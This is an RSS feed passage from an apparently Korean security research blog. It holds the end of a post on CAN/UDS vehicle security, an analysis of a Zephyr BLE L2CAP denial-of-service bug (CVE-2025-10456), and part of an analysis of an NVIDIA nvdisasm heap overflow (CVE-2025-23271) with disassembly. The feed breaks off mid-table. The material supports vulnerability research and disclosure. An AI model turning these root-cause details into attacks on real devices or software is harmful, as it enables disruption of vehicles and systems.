unlock!&quot;</span>)</code></pre><p><img src="image28.png" alt="image28.png"></p><p>&#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 1&#xC744; &#xD574;&#xC81C;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB3C4; &#xC5ED;&#xC2DC; &#xC791;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image29.jpg" alt="image29.jpg"></p><h2 id="4-UDS-&#xBA85;&#xB839;&#xC5B4;&#xB85C;-&#xBC1C;&#xC0DD;&#xD558;&#xB294;-CVE"><a href="#4-UDS-&#xBA85;&#xB839;&#xC5B4;&#xB85C;-&#xBC1C;&#xC0DD;&#xD558;&#xB294;-CVE" class="headerlink" title="4. UDS &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; CVE"></a>4. UDS &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; CVE</h2><p><img src="image30.jpg" alt="image30.jpg"></p><p>BlockHarbor CTF&#xB85C; &#xBC30;&#xC6B4; UDS &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xACE0;, &#xC2E4;&#xC81C;&#xB85C; CVE&#xAC00; &#xBC1C;&#xAE09;&#xC774; &#xB418;&#xB294; &#xC0AC;&#xB840;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB300;&#xD45C;&#xC801;&#xC73C;&#xB85C; Nissan Altima&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6347">CVE-2024-6347</a>&#xC785;&#xB2C8;&#xB2E4;.</p><p>CVE-2024-6347&#xB294; UDS &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD55C; DoS &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD55C; &#xC0AC;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. &#xC0AC;&#xAC01;&#xC9C0;&#xB300; &#xAC10;&#xC9C0; &#xC13C;&#xC11C; ECU &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0; ECU &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D; &#xC138;&#xC158;&#xC73C;&#xB85C; &#xBB34;&#xB2E8; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; DoS &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; CAN/UDS&#xB97C; &#xD1B5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC2DD;&#xBCC4;&#xC790; &#xC77D;&#xAE30; &#xC694;&#xCCAD;(<code>22</code>)&#xACFC; &#xB2E4;&#xC591;&#xD55C; &#xC9C4;&#xB2E8; &#xC694;&#xCCAD;(<code>19</code> &#xB4F1;)&#xC744; &#xD1B5;&#xD55C; Information Leak, &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4;(<code>27</code>) &#xC6B0;&#xD68C;&#xB97C; &#xD1B5;&#xD55C; ECU &#xBC0F; &#xCC28;&#xB7C9; &#xB0B4;&#xBD80; &#xAD8C;&#xD55C; &#xD0C8;&#xCDE8; &#xB4F1;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788;, &#xC8FC;&#xC18C; &#xC77D;&#xAE30; &#xC694;&#xCCAD;(<code>23</code>)&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xBBF8;&#xD761;&#xD558;&#xBA74;, &#xB0B4;&#xBD80; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC73C;&#xB85C; &#xD38C;&#xC6E8;&#xC5B4;&#xAC00; &#xC720;&#xCD9C; &#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C;, CAN/UDS &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xC5C4;&#xBC00;&#xD55C; &#xAC80;&#xC99D;&#xACFC; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4;&#xC758; &#xC811;&#xADFC; &#xC81C;&#xC5B4;&#xAC00; &#xCC28;&#xB7C9; &#xBCF4;&#xC548;&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC694;&#xC18C;&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xB2E4;&#xB978; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC8FC;&#xC81C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;! &#x1F44B;&#x1F3FB;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/CAN/">CAN</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/UDS/">UDS</category>
      
      <category domain="https://hackyboiz.github.io/tags/VSEC/">VSEC</category>
      
      <category domain="https://hackyboiz.github.io/tags/automotive/">automotive</category>
      
      <category domain="https://hackyboiz.github.io/tags/blockharbor/">blockharbor</category>
      
      <category domain="https://hackyboiz.github.io/tags/car/">car</category>
      
      <category domain="https://hackyboiz.github.io/tags/vehicle/">vehicle</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-10456 : Zephyr RTOS의 BLE의 검증 미흡으로 인한 DoS</title>
      <link>https://hackyboiz.github.io/2025/11/19/poosic/cve-2025-10456/</link>
      <guid>https://hackyboiz.github.io/2025/11/19/poosic/cve-2025-10456/</guid>
      <pubDate>Wed, 19 Nov 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2025-10456&quot;&gt;NV</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-10456">NVD: CVE-2025-10456</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Zephyr RTOS&#xC758; BLE &lt;= v4.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-10456&#xC740; Zephyr RTOS&#xC758; BLE(Bluetooth Low Energy)&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; DoS &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Bluetooth &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xC2A4;&#xD0DD; &#xC0C1;&#xC5D0;&#xC11C; &#xBB3C;&#xB9AC;&#xACC4;&#xCE35;&#xACFC; &#xADF8; &#xC0C1;&#xC704;&#xACC4;&#xCE35; &#xAC04;&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; L2CAP &#xACC4;&#xCE35;&#xC5D0;&#xC11C; integer overflow&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xCF54;&#xB4DC;&#xB85C; &#xBD80;&#xD130; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6D0;&#xC778;&#xC774; &#xB41C; &#xCF54;&#xB4DC;&#xB294; BLE&#xC758; L2CAP &#xCC98;&#xB9AC; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Bluetooth&#xC5D0;&#xC11C;&#xB294; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBA70; BLE&#xC5D0;&#xC11C;&#xB9CC; &#xD2B8;&#xB9AC;&#xAC70;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB41C; &#xACF3;&#xC740; L2CAP Flow Control Credit Indication &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; l2cap.c&#xC758; <code>le_credits()</code> &#xD568;&#xC218; &#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">le_credits</span><span class="hljs-params">(struct bt_l2cap *l2cap, <span class="hljs-keyword">uint8_t</span> ident,</span></span><span class="hljs-function"><span class="hljs-params">       struct net_buf *buf)</span></span><span class="hljs-function"></span>{<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_conn</span> *<span class="hljs-title">conn</span> = <span class="hljs-title">l2cap</span>-&gt;<span class="hljs-title">chan</span>.<span class="hljs-title">chan</span>.<span class="hljs-title">conn</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_chan</span> *<span class="hljs-title">chan</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_le_credits</span> *<span class="hljs-title">ev</span> = (<span class="hljs-title">void</span> *)<span class="hljs-title">buf</span>-&gt;<span class="hljs-title">data</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_le_chan</span> *<span class="hljs-title">le_chan</span>;</span><span class="hljs-keyword">uint16_t</span> credits, cid;...cid = sys_le16_to_cpu(ev-&gt;cid);credits = sys_le16_to_cpu(ev-&gt;credits);le_chan = BT_L2CAP_LE_CHAN(chan);<span class="hljs-keyword">if</span> (atomic_get(&amp;le_chan-&gt;tx.credits) + credits &gt; UINT16_MAX) { <span class="hljs-comment">//[1] trigger point</span>LOG_ERR(<span class="hljs-string">&quot;Credits overflow&quot;</span>);bt_l2cap_chan_disconnect(chan); <span class="hljs-comment">//disconnect when integer overflow</span><span class="hljs-keyword">return</span>;}</code></pre><p>&#xCF54;&#xB4DC;&#xC758; <code>[1]</code>&#xC5D0;&#xC11C; <code>credits</code>&#xB294; 16&#xBE44;&#xD2B8; &#xD544;&#xB4DC;&#xC774;&#xBA70; <code>tx.credits</code>&#xB294; <code>atomic_t</code> &#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>tx.credits</code>+<code>credits</code>&#xC758; &#xAC12;&#xC774; 65,535 &#xC774;&#xC0C1;&#xC77C; &#xACBD;&#xC6B0; integer overflow&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>UINT16_MAX</code>&#xB97C; &#xD55C;&#xACC4;&#xAC12;&#xC73C;&#xB85C; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xD574;&#xB2F9; &#xCC44;&#xB110;&#xC758; &#xC5F0;&#xACB0;&#xC744; &#xC885;&#xB8CC;&#xC2DC;&#xD0A4;&#xAE30; &#xC704;&#xD574; <code>bt_l2cap_chan_disconnect()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bt_l2cap_chan_disconnect</span><span class="hljs-params">(struct bt_l2cap_chan *chan)</span></span><span class="hljs-function"></span>{<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_conn</span> *<span class="hljs-title">conn</span> = <span class="hljs-title">chan</span>-&gt;<span class="hljs-title">conn</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_buf</span> *<span class="hljs-title">buf</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_disconn_req</span> *<span class="hljs-title">req</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_le_chan</span> *<span class="hljs-title">le_chan</span>;</span><span class="hljs-keyword">if</span> (!conn) {<span class="hljs-keyword">return</span> -ENOTCONN;}<span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_BT_CLASSIC) &amp;&amp; <span class="hljs-comment">//[*]</span>    conn-&gt;type == BT_CONN_TYPE_BR) {<span class="hljs-keyword">return</span> bt_l2cap_br_chan_disconnect(chan);}le_chan = BT_L2CAP_LE_CHAN(chan);LOG_DBG(<span class="hljs-string">&quot;chan %p scid 0x%04x dcid 0x%04x&quot;</span>, chan, le_chan-&gt;rx.cid, le_chan-&gt;tx.cid);le_chan-&gt;ident = get_ident(); <span class="hljs-comment">// alloc new ID to channel</span>buf = l2cap_create_le_sig_pdu(BT_L2CAP_DISCONN_REQ,      le_chan-&gt;ident, <span class="hljs-keyword">sizeof</span>(*req));<span class="hljs-keyword">if</span> (!buf) {<span class="hljs-keyword">return</span> -ENOMEM;}req = net_buf_add(buf, <span class="hljs-keyword">sizeof</span>(*req)); <span class="hljs-comment">// [2] request packet struct</span>req-&gt;dcid = sys_cpu_to_le16(le_chan-&gt;tx.cid);req-&gt;scid = sys_cpu_to_le16(le_chan-&gt;rx.cid);l2cap_chan_send_req(chan, buf, L2CAP_DISC_TIMEOUT); <span class="hljs-comment">// [3] send disconnect msg</span>bt_l2cap_chan_set_state(chan, BT_L2CAP_DISCONNECTING);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC774;&#xD6C4; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xCF54;&#xB4DC; <code>[2]</code>&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xCC44;&#xB110;&#xC758; <code>tx.cid</code>, <code>rx.cid</code>&#xB97C; <code>req</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xB2F4;&#xC544; &#xC5F0;&#xACB0; &#xD574;&#xC81C;&#xB97C; &#xC704;&#xD55C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xCF54;&#xB4DC;&#xC758; <code>[3]</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;.</p><p>| &#xCF54;&#xB4DC;&#xC758; <code>[*]</code> &#xBD80;&#xBD84;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Bluetooth&#xC5D0;&#xB294; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">le_disconn_rsp</span><span class="hljs-params">(struct bt_l2cap *l2cap, <span class="hljs-keyword">uint8_t</span> ident,</span></span><span class="hljs-function"><span class="hljs-params">   struct net_buf *buf)</span></span><span class="hljs-function"></span>{<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_conn</span> *<span class="hljs-title">conn</span> = <span class="hljs-title">l2cap</span>-&gt;<span class="hljs-title">chan</span>.<span class="hljs-title">chan</span>.<span class="hljs-title">conn</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_le_chan</span> *<span class="hljs-title">chan</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_disconn_rsp</span> *<span class="hljs-title">rsp</span> = (<span class="hljs-title">void</span> *)<span class="hljs-title">buf</span>-&gt;<span class="hljs-title">data</span>;</span><span class="hljs-keyword">uint16_t</span> scid;<span class="hljs-keyword">if</span> (buf-&gt;len &lt; <span class="hljs-keyword">sizeof</span>(*rsp)) {LOG_ERR(<span class="hljs-string">&quot;Too small LE disconn rsp packet size&quot;</span>);<span class="hljs-keyword">return</span>;}scid = sys_le16_to_cpu(rsp-&gt;scid);LOG_DBG(<span class="hljs-string">&quot;dcid 0x%04x scid 0x%04x&quot;</span>, sys_le16_to_cpu(rsp-&gt;dcid), scid);chan = l2cap_remove_rx_cid(conn, scid);<span class="hljs-keyword">if</span> (!chan) {<span class="hljs-keyword">return</span>;}bt_l2cap_chan_del(&amp;chan-&gt;chan);}</code></pre><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xD6C4; request&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; <code>le_disonn_rsp()</code>&#xC5D0;&#xC11C; <code>cid</code> &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xACE0;&#xC815;&#xB41C; CID &#xAC12;&#xC744; &#xAC00;&#xC9C0;&#xB294; &#xC911;&#xC694;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;(LE SIGNAL CHANNEL, SMP, ATT &#x2026;)&#xC5D0; &#xB300;&#xD574; &#xC5F0;&#xACB0;&#xD574;&#xC81C;&#xAC00; &#xAC00;&#xB2A5;&#xD574;&#xC838; DoS &#xACF5;&#xACA9;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://elixir.bootlin.com/zephyr/v4.1.0/source/subsys/bluetooth/host/l2cap.c">Zephyr: l2cap.c</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/DoS/">DoS</category>
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/Zephyr/">Zephyr</category>
      
      <category domain="https://hackyboiz.github.io/tags/BLE/">BLE</category>
      
      <category domain="https://hackyboiz.github.io/tags/L2CAP/">L2CAP</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-10456/">CVE-2025-10456</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/19/poosic/cve-2025-10456/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-23271: NVIDIA nvdisasm의 heap overflow 취약점</title>
      <link>https://hackyboiz.github.io/2025/11/05/ogu123/cve-2025-23271/</link>
      <guid>https://hackyboiz.github.io/2025/11/05/ogu123/cve-2025-23271/</guid>
      <pubDate>Wed, 05 Nov 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2025-2191">https://talosintelligence.com/vulnerability_reports/TALOS-2025-2191</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NVIDIA nvdisasm 12.8.90</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NVIDIA nvdisasm&#xB294; CUDA toolkit&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xB3C4;&#xAD6C;&#xB85C; CUDA ELF &#xD30C;&#xC77C;&#xC758; disassembly, control low graphs, register life-ranges, debug &#xC815;&#xBCF4;&#xB97C; &#xD45C;&#xC2DC;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> uint16 Elf32_Half;<span class="hljs-keyword">typedef</span> uint32 Elf32_Word;<span class="hljs-keyword">typedef</span> uint32 Elf32_Addr;<span class="hljs-keyword">typedef</span> uint32 Elf32_Off;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    Elf32_Word sh_name;    Elf32_Word sh_type;    Elf32_Word sh_flags;    Elf32_Addr sh_addr;    Elf32_Off  sh_offset;    Elf32_Word sh_size;    Elf32_Word sh_link;    Elf32_Word sh_info;    Elf32_Word sh_addralign;    Elf32_Word sh_entsize;} Elf32_Shdr;</code></pre><p>ELF &#xD30C;&#xC77C;&#xC758; .reloc &#xC139;&#xC158;&#xC740; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB85C;&#xB4DC;&#xB420; &#xB54C; &#xD544;&#xC694;&#xD55C; &#xC7AC;&#xBC30;&#xCE58;(relocation) &#xC815;&#xBCF4;&#xB97C; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; nvdisasm&#xC774; 32bit ELF &#xD30C;&#xC77C;&#xC758; .reloc &#xC139;&#xC158;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xBA74;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-number">0045</span>c699  mov     rsi, qword [rsp {var_b8_1}]<span class="hljs-number">0045</span>c69d  mov     rdi, qword [rax+<span class="hljs-number">0x18</span>]<span class="hljs-number">0045</span>c6a1  shr     rsi, <span class="hljs-number">0x3</span>                     (<span class="hljs-number">1</span>) <span class="hljs-number">0045</span>c6a5  shl     rsi, <span class="hljs-number">0x4</span>                     (<span class="hljs-number">2</span>)<span class="hljs-number">0045</span><span class="hljs-function">c6a9  call    <span class="hljs-title">sub_40a610</span>                   <span class="hljs-params">(<span class="hljs-number">3</span>)</span></span></code></pre><p>nvdisasm&#xC740; ELF &#xD30C;&#xC77C;&#xC758; .reloc &#xC139;&#xC158;&#xC744; 0x45ada0 &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD30C;&#xC2F1; &#xD569;&#xB2C8;&#xB2E4;.</p><p>offset 0x45c699&#xC5D0;&#xC11C; &#xD604;&#xC7AC; .reloc &#xC139;&#xC158;&#xC758; <code>sh_size</code>&#xB97C; rsi &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB85C; &#xC62E;&#xAE30;&#xACE0; (1),(2)&#xB97C; &#xD1B5;&#xD574; <code>sh_size</code> &#xAC12;&#xC744; 2&#xBC30;&#xB85C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, <code>sh_size</code> &#xAC12;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xD06C;&#xAE30;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-number">0045</span>c07b  lea     r14, [rbx+rsi]               ...<span class="hljs-number">0045</span>c6ef  lea     rax, [r14+<span class="hljs-number">0x7</span>]               <span class="hljs-number">0045</span>c6f3  lea     rsi, [rbx+<span class="hljs-number">0x8</span>]               <span class="hljs-number">0045</span>c6f7  sub     rax, rsi                     ...<span class="hljs-number">0045</span>c6fa  mov     r8, rax     <span class="hljs-number">0045</span>c6fd  shr     r8, <span class="hljs-number">0x3</span>     <span class="hljs-number">0045</span>c701  add     r8, <span class="hljs-number">0x1</span>     ...<span class="hljs-number">0045</span>c70f  mov     rdi, r8     ...<span class="hljs-number">0045</span>c718  shr     rdi, <span class="hljs-number">0x2</span></code></pre><pre><code class="hljs cpp">loop_counter = (((sh_size<span class="hljs-number">-1</span>) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">2</span></code></pre><p>&#xC704; &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xB97C; &#xD574;&#xC11D;&#xD558;&#xBA74; <code>sh_size</code>(rsi)&#xC744; &#xD1B5;&#xD574; &#xBC18;&#xBCF5;&#xBB38; &#xCE74;&#xC6B4;&#xD2B8; &#xAC12;&#xC744; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-number">0045</span>c720  movdqu  xmm0, xmmword [rdx+<span class="hljs-number">0x10</span>]<span class="hljs-number">0045</span>c725  pxor    xmm6, xmm6<span class="hljs-number">0045</span>c729  add     rsi, <span class="hljs-number">0x1</span>                    <span class="hljs-number">0045</span>c72d  add     rdx, <span class="hljs-number">0x20</span>                   <span class="hljs-number">0045</span>c731  add     rax, <span class="hljs-number">0x40</span>                   (<span class="hljs-number">4</span>)...<span class="hljs-number">0045</span>c79d  movups  xmmword [rax<span class="hljs-number">-0x30</span>], xmm5    (<span class="hljs-number">5.</span>a)<span class="hljs-number">0045</span>c7a1  movups  xmmword [rax<span class="hljs-number">-0x40</span>], xmm1    (<span class="hljs-number">5.b</span>)...<span class="hljs-number">0045</span>c7b1  movups  xmmword [rax<span class="hljs-number">-0x10</span>], xmm4    (<span class="hljs-number">5.</span>c)<span class="hljs-number">0045</span>c7b5  movups  xmmword [rax<span class="hljs-number">-0x20</span>], xmm1    (<span class="hljs-number">5.</span>d)<span class="hljs-number">0045</span>c7b9  cmp     rdi, rsi<span class="hljs-number">0045</span>c7bc  ja      <span class="hljs-number">0x45c720</span></code></pre><p>&#xC774;&#xD6C4; &#xBC18;&#xBCF5;&#xBB38;&#xC744; &#xD1B5;&#xD574; AVX &#xC154;&#xD50C; &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xB370; (4),(5.a)~(5.d)&#xB97C; &#xD1B5;&#xD574; &#xBCF5;&#xC0AC;&#xB418;&#xB294; heap &#xC601;&#xC5ED;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; rax&#xAC00; 0x40&#xC529; &#xC99D;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cpp">buffer_size = (sh_size &gt;&gt; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">4</span>loop_counter = (((sh_size<span class="hljs-number">-1</span>) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">2</span>assumed_size = loop_counter * <span class="hljs-number">0x40</span></code></pre><p>&#xC55E;&#xC11C; <code>sh_size</code> &#xAC12;&#xC744; &#xD1B5;&#xD574; heap size&#xC640; &#xBC18;&#xBCF5;&#xBB38; &#xD69F;&#xC218;&#xB97C; &#xAD6C;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xB2E4;&#xC2DC; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74;, &#xD2B9;&#xC815; <code>sh_size</code> &#xAC12;&#xC744; &#xD1B5;&#xD574; assumed_size&#xAC00; buffer_size &#xBCF4;&#xB2E4; &#xD06C;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC838; heap overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">sh_size: <span class="hljs-number">0x19</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1a</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1b</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1c</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1d</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1e</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1f</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span 